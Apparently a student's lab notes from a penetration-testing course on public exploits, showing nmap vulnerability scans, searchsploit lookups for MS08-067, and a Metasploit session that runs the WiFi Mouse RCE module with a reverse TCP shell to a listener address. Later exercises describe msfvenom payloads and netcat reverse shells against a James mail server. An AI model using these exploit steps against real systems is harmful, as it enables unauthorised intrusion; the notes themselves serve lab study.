3rd phase (After Information gathering then enumeration)

Exploit Databse from Offsec
Patcket Storm
Github
Metasploit
Core Impact
Searchsploit
Nmap NSE Scripts


nmap --script vuln 192.168.1.100


### Exercise: PublicExploits01

**START WITH ENUMERATION**
┌──(hollacosta㉿kali1)-[~]
└─$ sudo nmap -T5 --top-ports=1000 -sS -O 192.168.196.10 
[sudo] password for hollacosta: 
Warning: File ./nmap-os-db exists, but Nmap is using /usr/bin/../share/nmap/nmap-os-db for security and consistency reasons.  set NMAPDIR=. to give priority to files in your local directory (may affect the other data files too).
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 18:50 EDT
Nmap scan report for 192.168.196.10
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|10 (88%), FreeBSD 6.X (86%)
OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows 11 21H2 (88%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds

**FOLLOW BY SEARCH OF VULNERABILITIES**

nmap --script vuln -A -0 -sV 192.168.196.10

┌──(hollacosta㉿kali1)-[~]
└─$ sudo nmap --script vuln -A -O -sV 192.168.196.10                         1 ⨯
Warning: File ./nmap-os-db exists, but Nmap is using /usr/bin/../share/nmap/nmap-os-db for security and consistency reasons.  set NMAPDIR=. to give priority to files in your local directory (may affect the other data files too).
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 18:53 EDT
Nmap scan report for 192.168.196.10
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
#####

Network Distance: 4 hops
Service Info: Host: REMOTEMOUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
**|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067) ------------THIS IS USEFUL INFORMATION
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250**   ------------THIS IS WHAT I LOOK FOR


**I LOOK FOR THE EXPLOIT USING MS08-067 AS MY KEYWORD**
┌──(hollacosta㉿kali1)-[~]
└─$ searchsploit MS08-067                           
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execut | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS0 | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Pa | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Exec | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Exec | windows/remote/7132.py
----------------------------------------------- ---------------------------------

SWITCHED DIRECTORIES FOR A BETTER VIEW

┌──(hollacosta㉿kali1)-[/usr/…/exploitdb/exploits/windows/remote]

![[Pasted image 20231012041848.png]]
![[Pasted image 20231012191642.png]]
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search 50972



   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  exploit/windows/misc/wifi_mouse_rce  2021-02-25       normal  No     Wifi Mouse RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/wifi_mouse_rce

**msf6 > use exploit /windows/misc/wifi_mouse_rce**
Using configured payload windows/shell/reverse_tcp



   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  exploit/windows/misc/wifi_mouse_rce  2021-02-25       normal  No     Wifi Mouse RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/wifi_mouse_rce

 Using exploit/windows/misc/wifi_mouse_rce
msf6 exploit(windows/misc/wifi_mouse_rce) > options

Module options (exploit/windows/misc/wifi_mouse_rce):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LINEMAX  1020             yes       Maximum length of lines to send for stager method.  Smaller for more unstable connections.
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    1978             yes       Port WiFi Mouse Mouse Server runs on (TCP)
   SLEEP    1                yes       How long to sleep between commands
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addr
                                       esses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   stager



View the full module info with the info, or info -d command.

msf6 exploit(windows/misc/wifi_mouse_rce) > set RHOSTS 192.168.217.10
RHOSTS => 192.168.217.10
msf6 exploit(windows/misc/wifi_mouse_rce) > set LHOST 192.168.45.181
LHOST => 192.168.45.181
msf6 exploit(windows/misc/wifi_mouse_rce) > run

          ########################

C:\Windows\system32>


### Exercise: PublicExploit02
![[Pasted image 20231012195414.png]]

![[Pasted image 20231012195728.png]]

![[Pasted image 20231012205006.png]]
using Searchsploit, found that 50512 was a RCE
![[Pasted image 20231012205057.png]]
copy it and ran it against the target
![[Pasted image 20231012205154.png]]
tried a revshell.com payload and notice something in my nc
![[Pasted image 20231012205326.png]]
check msfvenom to see what payloads I can create
use msfvenom -l payloads, but since there are too many, narrow it according to machine type. for this one, is msfvenom -l payloads | grep "cmd/unix*" 
![[Pasted image 20231012205702.png]]

![[Pasted image 20231012205940.png]]
once payload created,
use it to see results
![[Pasted image 20231012210052.png]]
upgrade the shell then find the flag

![[Pasted image 20231012210137.png]]

## CAPSTONE EXERCISE

![[Pasted image 20231013084946.png]]


─$ sudo nmap --script vuln -p 22,32822,32823,32824,32825,32826 -A -O -sV 192.168.208.52 

Warning: File ./nmap-os-db exists, but Nmap is using /usr/bin/../share/nmap/nmap-os-db for security and consistency reasons.  set NMAPDIR=. to give priority to files in your local directory (may affect the other data files too).
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 05:35 EDT
Nmap scan report for 192.168.208.52
Host is up (0.032s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.4p1: 
|       PRION:CVE-2021-28041    4.6     https://vulners.com/prion/PRION:CVE-2021-28041
|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
|       PRION:CVE-2021-41617    4.4     https://vulners.com/prion/PRION:CVE-2021-41617
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
|       PRION:CVE-2021-36368    2.6     https://vulners.com/prion/PRION:CVE-2021-36368
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368

**ODLY SPECIFIC PORTS AND SERVICES HERE**


**32822/tcp open  james-admin JAMES Remote Admin 2.3.2
32823/tcp open  nntp        JAMES nntpd (posting ok)
32824/tcp open  pop3        JAMES pop3d 2.3.2
32825/tcp open  smtp        JAMES smtpd 2.3.2**


| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
32826/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19     *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97     *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328*EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009*EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621       *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0     *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283     *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730*EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227       *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-  *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937*EXPLOIT*
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 4.4 (87%), WatchGuard Fireware 11.8 (87%), Linux 5.3 - 5.4 (87%), Linux 4.8 (86%), Synology DiskStation Manager 5.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: bbd5e078db50; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   32.69 ms 192.168.45.1
2   29.73 ms 192.168.45.254
3   30.49 ms 192.168.251.1
4   30.98 ms 192.168.208.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds

![[Pasted image 20231013100656.png]]

RCE Vulnerability! got the exploit and adjusted parameters according to the ports
![[Pasted image 20231013100846.png]]
change to the nc payload
![[Pasted image 20231013100933.png]]
open nc port, and await for execution!

![[Pasted image 20231013101014.png]]

![[Pasted image 20231013101028.png]]
